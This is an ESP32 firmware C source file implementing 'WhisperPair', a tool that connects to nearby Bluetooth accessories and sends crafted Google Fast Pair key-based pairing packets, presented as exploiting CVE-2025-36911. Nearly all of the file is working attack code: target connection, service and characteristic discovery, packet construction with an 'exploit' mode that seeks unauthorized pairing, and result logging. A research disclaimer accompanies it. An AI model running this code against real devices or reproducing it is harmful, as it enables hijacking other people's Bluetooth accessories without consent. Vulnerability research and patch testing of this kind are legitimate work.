/*
 * ble_whisperpair.c — WhisperPair (CVE-2025-36911) Google Fast Pair KBP bypass
 *
 * FOR AUTHORIZED SECURITY RESEARCH ONLY.  See ble_whisperpair.h for the full
 * legal disclaimer, vulnerability description, and Janos porting guide.
 *
 * References:
 *   CVE-2025-36911 — NVD: https://nvd.nist.gov/vuln/detail/CVE-2025-36911
 *   KU Leuven paper — https://eng.kuleuven.be/en/news-calendar/news-items/
 *                       hijacking-bluetooth-accessories-using-google-fast-pair
 *   ESP32 POC reference: https://github.com/PivotChip/FrostedFastPair
 */

#include "ble_whisperpair.h"
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/stat.h>
#include <time.h>
#include "esp_log.h"
#include "esp_heap_caps.h"
#include "esp_random.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "host/ble_hs.h"
#include "host/ble_gap.h"
#include "host/ble_gatt.h"
#include "os/os_mbuf.h"

/* Janos porting: replace these two includes + ets_aes_* calls with your AES impl */
#include "esp32c5/rom/aes.h"   /* ets_aes_enable/disable/setkey_enc/block */

static const char *TAG = "wp";

/* ── Fast Pair KBP characteristic UUID (128-bit, little-endian) ───────
 * Standard form: fe2c1234-8366-4814-8eb0-01de32100bea               */
static const ble_uuid128_t s_kbp_chr_uuid = BLE_UUID128_INIT(
    0xea, 0x0b, 0x10, 0x32, 0xde, 0x01, 0xb0, 0x8e,
    0x14, 0x48, 0x66, 0x83, 0x34, 0x12, 0x2c, 0xfe
);

/* ── Internal state ─────────────────────────────────────────────────── */
static SemaphoreHandle_t  s_sd_mutex     = NULL;
static SemaphoreHandle_t  s_conn_sem     = NULL;   /* signalled on connect/fail */
static SemaphoreHandle_t  s_op_sem       = NULL;   /* signalled after each GATT op */
static SemaphoreHandle_t  s_notify_sem   = NULL;   /* signalled on KBP notification */

static volatile bool      s_active       = false;
static volatile bool      s_cancel_req   = false;
static volatile int       s_conn_rc      = 0;
static volatile int       s_op_rc        = 0;
static volatile uint16_t  s_conn_handle  = BLE_HS_CONN_HANDLE_NONE;
static volatile uint16_t  s_svc_start    = 0;
static volatile uint16_t  s_svc_end      = 0;
static volatile uint16_t  s_kbp_handle  = 0;       /* KBP characteristic value handle */
static volatile bool      s_notify_got   = false;
static volatile uint8_t   s_notify_data[20];
static volatile uint8_t   s_notify_len   = 0;

static char               s_status[96]   = "Idle";

static StackType_t       *s_task_stack   = NULL;
static StaticTask_t       s_task_tcb;
static TaskHandle_t       s_task_handle  = NULL;

/* Saved parameters for task */
static uint8_t  s_target_mac[6];
static uint8_t  s_target_addr_type;
static char     s_target_name[32];
static int8_t   s_target_rssi;
static wp_mode_t s_mode;
static wp_cb_t   s_cb;

/* ── Helpers ────────────────────────────────────────────────────────── */

static void s_set_status(const char *msg)
{
    strncpy(s_status, msg, sizeof(s_status) - 1);
    s_status[sizeof(s_status) - 1] = '\0';
    ESP_LOGI(TAG, "%s", msg);
}

static void s_disconnect(void)
{
    if (s_conn_handle != BLE_HS_CONN_HANDLE_NONE) {
        ble_gap_terminate(s_conn_handle, 0x13);
        s_conn_handle = BLE_HS_CONN_HANDLE_NONE;
    }
}

/* ── AES-128-ECB single-block encrypt ──────────────────────────────────
 * Janos: replace body with mbedtls_aes_crypt_ecb or equivalent.
 * key must be 16 bytes, in/out must be 16 bytes.                      */
static void s_aes128_ecb_encrypt(const uint8_t key[16],
                                  const uint8_t in[16], uint8_t out[16])
{
    ets_aes_enable();
    ets_aes_setkey_enc(key, AES128);
    ets_aes_block(in, out);
    ets_aes_disable();
}

/* ── SD log ─────────────────────────────────────────────────────────── */

static void s_log_result(const char *mac_str, wp_mode_t mode,
                          wp_result_t result, const uint8_t *pkt,
                          const uint8_t *notify_data, uint8_t notify_len)
{
    if (!s_sd_mutex) return;

    char ts[20];
    time_t now = time(NULL);
    struct tm *t = localtime(&now);
    if (t && now > 1700000000)
        strftime(ts, sizeof(ts), "%Y%m%d_%H%M%S", t);
    else
        snprintf(ts, sizeof(ts), "%lu", (unsigned long)(esp_timer_get_time() / 1000000));

    char path[80];
    char mac_clean[13];
    /* remove colons for filename */
    int j = 0;
    for (int i = 0; mac_str[i] && j < 12; i++)
        if (mac_str[i] != ':') mac_clean[j++] = mac_str[i];
    mac_clean[j] = '\0';
    snprintf(path, sizeof(path), "/sdcard/lab/ble/whisperpair/%s_%s.json",
             ts, mac_clean);

    const char *result_str = (result == WP_RESULT_VULNERABLE) ? "VULNERABLE" :
                             (result == WP_RESULT_PATCHED)    ? "PATCHED"    :
                             (result == WP_RESULT_NO_SERVICE) ? "NO_SERVICE" :
                             (result == WP_RESULT_CONNECT_FAIL) ? "CONNECT_FAIL" : "ERROR";

    if (xSemaphoreTake(s_sd_mutex, pdMS_TO_TICKS(3000)) == pdTRUE) {
        mkdir("/sdcard/lab", 0755);
        mkdir("/sdcard/lab/ble", 0755);
        mkdir("/sdcard/lab/ble/whisperpair", 0755);
        FILE *f = fopen(path, "w");
        if (f) {
            fprintf(f, "{\n");
            fprintf(f, "  \"cve\": \"CVE-2025-36911\",\n");
            fprintf(f, "  \"timestamp\": \"%s\",\n", ts);
            fprintf(f, "  \"target_mac\": \"%s\",\n", mac_str);
            fprintf(f, "  \"target_name\": \"%s\",\n", s_target_name);
            fprintf(f, "  \"rssi\": %d,\n", (int)s_target_rssi);
            fprintf(f, "  \"mode\": \"%s\",\n",
                    mode == WP_MODE_PROBE ? "probe" : "exploit");
            fprintf(f, "  \"result\": \"%s\",\n", result_str);
            if (pkt) {
                fprintf(f, "  \"kbp_packet_hex\": \"");
                for (int i = 0; i < 16; i++) fprintf(f, "%02X", pkt[i]);
                fprintf(f, "\",\n");
            }
            if (notify_len > 0) {
                fprintf(f, "  \"notify_response_hex\": \"");
                for (int i = 0; i < notify_len; i++) fprintf(f, "%02X", notify_data[i]);
                fprintf(f, "\",\n");
            }
            fprintf(f, "  \"disclaimer\": \"Authorized security research only — CVE-2025-36911\"\n");
            fprintf(f, "}\n");
            fclose(f);
            ESP_LOGI(TAG, "Saved %s", path);
        }
        xSemaphoreGive(s_sd_mutex);
    }
}

/* ── NimBLE GAP event callback ──────────────────────────────────────── */

static int s_gap_cb(struct ble_gap_event *event, void *arg)
{
    switch (event->type) {
    case BLE_GAP_EVENT_CONNECT:
        s_conn_rc = event->connect.status;
        if (event->connect.status == 0)
            s_conn_handle = event->connect.conn_handle;
        xSemaphoreGive(s_conn_sem);
        return 0;

    case BLE_GAP_EVENT_DISCONNECT:
        s_conn_handle = BLE_HS_CONN_HANDLE_NONE;
        /* Unblock any pending op */
        xSemaphoreGive(s_op_sem);
        xSemaphoreGive(s_notify_sem);
        return 0;

    case BLE_GAP_EVENT_NOTIFY_RX:
        if (!s_notify_got) {
            uint16_t len = OS_MBUF_PKTLEN(event->notify_rx.om);
            if (len > sizeof(s_notify_data)) len = sizeof(s_notify_data);
            os_mbuf_copydata(event->notify_rx.om, 0, len, (void *)s_notify_data);
            s_notify_len = (uint8_t)len;
            s_notify_got = true;
            xSemaphoreGive(s_notify_sem);
        }
        return 0;

    default:
        return 0;
    }
}

/* ── GATT service discovery callback ────────────────────────────────── */

static int s_svc_disc_cb(uint16_t conn_handle,
                          const struct ble_gatt_error *error,
                          const struct ble_gatt_svc *service, void *arg)
{
    (void)conn_handle; (void)arg;
    if (error->status == 0 && service) {
        s_svc_start = service->start_handle;
        s_svc_end   = service->end_handle;
    } else if (error->status == BLE_HS_EDONE) {
        s_op_rc = 0;
        xSemaphoreGive(s_op_sem);
    } else if (error->status != 0) {
        s_op_rc = error->status;
        xSemaphoreGive(s_op_sem);
    }
    return 0;
}

/* ── GATT characteristic discovery callback ─────────────────────────── */

static int s_chr_disc_cb(uint16_t conn_handle,
                          const struct ble_gatt_error *error,
                          const struct ble_gatt_chr *chr, void *arg)
{
    (void)conn_handle; (void)arg;
    if (error->status == 0 && chr) {
        /* Match KBP characteristic by UUID */
        if (ble_uuid_cmp(&chr->uuid.u, &s_kbp_chr_uuid.u) == 0)
            s_kbp_handle = chr->val_handle;
    } else if (error->status == BLE_HS_EDONE) {
        s_op_rc = 0;
        xSemaphoreGive(s_op_sem);
    } else if (error->status != 0) {
        s_op_rc = error->status;
        xSemaphoreGive(s_op_sem);
    }
    return 0;
}

/* ── GATT write callback ─────────────────────────────────────────────── */

static int s_write_cb(uint16_t conn_handle,
                       const struct ble_gatt_error *error,
                       struct ble_gatt_attr *attr, void *arg)
{
    (void)conn_handle; (void)attr; (void)arg;
    s_op_rc = error->status;
    xSemaphoreGive(s_op_sem);
    return 0;
}

/* ── Build and optionally encrypt the KBP packet ───────────────────────
 *
 * KBP request block (16 bytes):
 *   [0]     Type  = 0x00 (key-based pairing request)
 *   [1]     Flags = 0x00
 *   [2-7]   Provider MAC (6 bytes, big-endian from advertisement)
 *   [8-15]  Salt (8 random bytes)
 *
 * Probe mode: send plaintext block (device should reject unknown keys;
 *   if it sends a notification anyway → VULNERABLE).
 * Exploit mode: AES-128-ECB encrypt with key = Salt || 0x00×8.
 */
static void s_build_kbp_packet(const uint8_t mac[6], wp_mode_t mode,
                                 uint8_t out[16])
{
    uint8_t block[16] = {0};
    block[0] = 0x00;   /* Type: key-based pairing request */
    block[1] = 0x00;   /* Flags */
    memcpy(&block[2], mac, 6);

    uint8_t salt[8];
    esp_fill_random(salt, sizeof(salt));
    memcpy(&block[8], salt, 8);

    if (mode == WP_MODE_EXPLOIT) {
        /* AES key = Salt (8 bytes) zero-padded to 128 bits */
        uint8_t aes_key[16] = {0};
        memcpy(aes_key, salt, 8);
        s_aes128_ecb_encrypt(aes_key, block, out);
        ESP_LOGI(TAG, "KBP packet built (AES-ECB encrypted)");
    } else {
        /* Probe: send plaintext — vulnerable devices accept without checking mode */
        memcpy(out, block, 16);
        ESP_LOGI(TAG, "KBP packet built (plaintext probe)");
    }
}

/* ── Main probe/exploit task ─────────────────────────────────────────── */

static void s_wp_task(void *arg)
{
    (void)arg;

    char mac_str[18];
    snprintf(mac_str, sizeof(mac_str), "%02X:%02X:%02X:%02X:%02X:%02X",
             s_target_mac[5], s_target_mac[4], s_target_mac[3],
             s_target_mac[2], s_target_mac[1], s_target_mac[0]);

    wp_result_t result = WP_RESULT_ERROR;
    const char *detail = "Unknown error";
    uint8_t kbp_pkt[16] = {0};
    bool    pkt_built   = false;

    /* ── 1. Connect ──────────────────────────────────────────────── */
    s_set_status("Connecting...");
    s_svc_start  = 0;
    s_svc_end    = 0;
    s_kbp_handle = 0;
    s_notify_got = false;
    s_notify_len = 0;

    ble_addr_t peer = { .type = s_target_addr_type };
    memcpy(peer.val, s_target_mac, 6);
    ble_att_set_preferred_mtu(64);

    xSemaphoreTake(s_conn_sem, 0);   /* drain */

    int rc = ble_gap_connect(BLE_OWN_ADDR_PUBLIC, &peer,
                              WP_CONNECT_TIMEOUT_MS, NULL, s_gap_cb, NULL);
    if (rc != 0) {
        char msg[64];
        snprintf(msg, sizeof(msg), "Connect init failed (%d)", rc);
        s_set_status(msg);
        result = WP_RESULT_CONNECT_FAIL;
        detail = "Could not initiate connection";
        goto done;
    }

    if (xSemaphoreTake(s_conn_sem,
                        pdMS_TO_TICKS(WP_CONNECT_TIMEOUT_MS + 1000)) != pdTRUE
        || s_conn_rc != 0) {
        s_set_status("Connection failed");
        result = WP_RESULT_CONNECT_FAIL;
        detail = "BLE connection timed out or rejected";
        goto done;
    }

    if (s_cancel_req) goto cancelled;

    /* ── 2. Discover Fast Pair service (0xFE2C) ──────────────────── */
    s_set_status("Discovering Fast Pair service...");
    {
        ble_uuid16_t svc_uuid = BLE_UUID16_INIT(WP_SVC_UUID16);
        xSemaphoreTake(s_op_sem, 0);
        rc = ble_gattc_disc_svc_by_uuid(s_conn_handle, &svc_uuid.u,
                                          s_svc_disc_cb, NULL);
        if (rc != 0 ||
            xSemaphoreTake(s_op_sem, pdMS_TO_TICKS(5000)) != pdTRUE) {
            s_set_status("Service discovery failed");
            result = WP_RESULT_NO_SERVICE;
            detail = "Fast Pair service (0xFE2C) discovery failed";
            goto done;
        }
    }

    if (s_svc_start == 0 && s_svc_end == 0) {
        s_set_status("No Fast Pair service");
        result = WP_RESULT_NO_SERVICE;
        detail = "Device does not expose Fast Pair service (0xFE2C)";
        goto done;
    }

    if (s_cancel_req) goto cancelled;
    ESP_LOGI(TAG, "FP service found: handles %d-%d", s_svc_start, s_svc_end);

    /* ── 3. Discover KBP characteristic ─────────────────────────── */
    s_set_status("Finding KBP characteristic...");
    {
        xSemaphoreTake(s_op_sem, 0);
        rc = ble_gattc_disc_chrs_by_uuid(s_conn_handle,
                                           s_svc_start, s_svc_end,
                                           &s_kbp_chr_uuid.u,
                                           s_chr_disc_cb, NULL);
        if (rc != 0 ||
            xSemaphoreTake(s_op_sem, pdMS_TO_TICKS(5000)) != pdTRUE) {
            s_set_status("KBP chr discovery failed");
            result = WP_RESULT_ERROR;
            detail = "KBP characteristic discovery failed";
            goto done;
        }
    }

    if (s_kbp_handle == 0) {
        s_set_status("KBP characteristic not found");
        result = WP_RESULT_NO_SERVICE;
        detail = "KBP characteristic (fe2c1234...) not present";
        goto done;
    }

    if (s_cancel_req) goto cancelled;
    ESP_LOGI(TAG, "KBP chr at val_handle=%d", s_kbp_handle);

    /* ── 4. Enable notifications (CCCD = val_handle + 1) ─────────── */
    s_set_status("Subscribing to KBP notifications...");
    {
        uint16_t cccd_handle = s_kbp_handle + 1;
        uint16_t cccd_val    = 0x0001;   /* enable notifications */
        xSemaphoreTake(s_op_sem, 0);
        rc = ble_gattc_write_flat(s_conn_handle, cccd_handle,
                                   &cccd_val, sizeof(cccd_val),
                                   s_write_cb, NULL);
        if (rc == 0)
            xSemaphoreTake(s_op_sem, pdMS_TO_TICKS(3000));
        /* CCCD write may fail on some devices — continue anyway */
    }

    if (s_cancel_req) goto cancelled;

    /* ── 5. Build and write KBP packet ───────────────────────────── */
    s_build_kbp_packet(s_target_mac, s_mode, kbp_pkt);
    pkt_built = true;

    {
        char msg[64];
        snprintf(msg, sizeof(msg), "%s — writing KBP packet...",
                 s_mode == WP_MODE_PROBE ? "Probing" : "Exploiting");
        s_set_status(msg);
    }

    xSemaphoreTake(s_op_sem, 0);
    rc = ble_gattc_write_flat(s_conn_handle, s_kbp_handle,
                               kbp_pkt, sizeof(kbp_pkt),
                               s_write_cb, NULL);
    if (rc != 0) {
        s_set_status("KBP write init failed");
        result = WP_RESULT_ERROR;
        detail = "Failed to initiate KBP write";
        goto done;
    }
    if (xSemaphoreTake(s_op_sem, pdMS_TO_TICKS(5000)) != pdTRUE) {
        s_set_status("KBP write timed out");
        result = WP_RESULT_ERROR;
        detail = "KBP write timed out";
        goto done;
    }
    if (s_op_rc != 0) {
        /* Write rejected by device — strongly suggests patched */
        s_set_status("KBP write rejected — likely patched");
        result = WP_RESULT_PATCHED;
        detail = "Device rejected KBP write (patched)";
        goto done;
    }

    if (s_cancel_req) goto cancelled;

    /* ── 6. Wait for notification response ───────────────────────── */
    s_set_status("Waiting for KBP notification...");
    xSemaphoreTake(s_notify_sem, 0);   /* drain */
    bool got_notify = (xSemaphoreTake(s_notify_sem,
                        pdMS_TO_TICKS(WP_NOTIFY_TIMEOUT_MS)) == pdTRUE
                       && s_notify_got);

    if (got_notify) {
        char msg[80];
        snprintf(msg, sizeof(msg),
                 s_mode == WP_MODE_PROBE
                     ? "VULNERABLE — device accepted plaintext KBP"
                     : "VULNERABLE — unauthorized pairing accepted");
        s_set_status(msg);
        result = WP_RESULT_VULNERABLE;
        detail = (s_mode == WP_MODE_PROBE)
                     ? "Accepted KBP without pairing mode check (CVE-2025-36911)"
                     : "Unauthorized pairing handshake accepted";
    } else {
        s_set_status("No response — device patched or requires pairing mode");
        result = WP_RESULT_PATCHED;
        detail = "No KBP notification within timeout — device appears patched";
    }
    goto done;

cancelled:
    result = WP_RESULT_ERROR;
    detail = "Cancelled";
    s_set_status("Cancelled");

done:
    s_disconnect();

    /* Log to SD */
    s_log_result(mac_str, s_mode, result, pkt_built ? kbp_pkt : NULL,
                 s_notify_got ? (const uint8_t *)s_notify_data : NULL,
                 s_notify_got ? s_notify_len : 0);

    /* Fire callback before marking inactive so caller can read state */
    if (s_cb) s_cb(result, detail, s_target_mac, s_mode);

    s_active      = false;
    s_cancel_req  = false;
    s_task_handle = NULL;

    heap_caps_free(s_task_stack);
    s_task_stack = NULL;
    vTaskDelete(NULL);
}

/* ── Public API ──────────────────────────────────────────────────────── */

void wp_init(SemaphoreHandle_t sd_mutex)
{
    s_sd_mutex = sd_mutex;
    if (!s_conn_sem)   s_conn_sem   = xSemaphoreCreateBinary();
    if (!s_op_sem)     s_op_sem     = xSemaphoreCreateBinary();
    if (!s_notify_sem) s_notify_sem = xSemaphoreCreateBinary();
    ESP_LOGI(TAG, "Initialised (sd=%s)", sd_mutex ? "yes" : "no");
}

bool wp_is_fast_pair_adv(const struct ble_hs_adv_fields *fields)
{
    if (!fields) return false;

    /* Service Data with 16-bit UUID 0xFE2C (little-endian prefix: 0x2C 0xFE) */
    if (fields->svc_data_uuid16 && fields->svc_data_uuid16_len >= 2) {
        uint16_t uuid = fields->svc_data_uuid16[0] |
                        ((uint16_t)fields->svc_data_uuid16[1] << 8);
        if (uuid == WP_SVC_UUID16) return true;
    }

    /* Also check 16-bit UUID list (some devices advertise service UUID separately) */
    for (int i = 0; i < fields->num_uuids16; i++) {
        if (ble_uuid_u16(&fields->uuids16[i].u) == WP_SVC_UUID16) return true;
    }

    return false;
}

bool wp_start(const uint8_t mac[6], uint8_t addr_type, const char *name,
              int8_t rssi, wp_mode_t mode, wp_cb_t result_cb)
{
    if (s_active) {
        ESP_LOGW(TAG, "Already active");
        return false;
    }

    memcpy(s_target_mac, mac, 6);
    s_target_addr_type = addr_type;
    strncpy(s_target_name, name ? name : "", sizeof(s_target_name) - 1);
    s_target_name[sizeof(s_target_name) - 1] = '\0';
    s_target_rssi = rssi;
    s_mode        = mode;
    s_cb          = result_cb;

    s_active      = true;
    s_cancel_req  = false;
    s_conn_handle = BLE_HS_CONN_HANDLE_NONE;
    s_svc_start   = 0;
    s_svc_end     = 0;
    s_kbp_handle  = 0;
    s_notify_got  = false;

    /* Allocate task stack from PSRAM to save internal SRAM */
    s_task_stack = heap_caps_malloc(4096 * sizeof(StackType_t), MALLOC_CAP_SPIRAM);
    if (!s_task_stack) {
        ESP_LOGE(TAG, "Stack alloc failed");
        s_active = false;
        return false;
    }

    s_task_handle = xTaskCreateStatic(s_wp_task, "wp_task", 4096, NULL,
                                       tskIDLE_PRIORITY + 2,
                                       s_task_stack, &s_task_tcb);
    if (!s_task_handle) {
        ESP_LOGE(TAG, "Task create failed");
        heap_caps_free(s_task_stack);
        s_task_stack = NULL;
        s_active = false;
        return false;
    }

    ESP_LOGI(TAG, "Started %s mode against %02X:%02X:%02X:%02X:%02X:%02X",
             mode == WP_MODE_PROBE ? "probe" : "exploit",
             mac[5], mac[4], mac[3], mac[2], mac[1], mac[0]);
    return true;
}

void wp_cancel(void)
{
    if (!s_active) return;
    s_cancel_req = true;
    if (s_conn_handle != BLE_HS_CONN_HANDLE_NONE)
        ble_gap_terminate(s_conn_handle, 0x13);
    else
        ble_gap_conn_cancel();
    ESP_LOGI(TAG, "Cancel requested");
}

bool wp_is_active(void) { return s_active; }

const char *wp_status(void) { return s_status; }
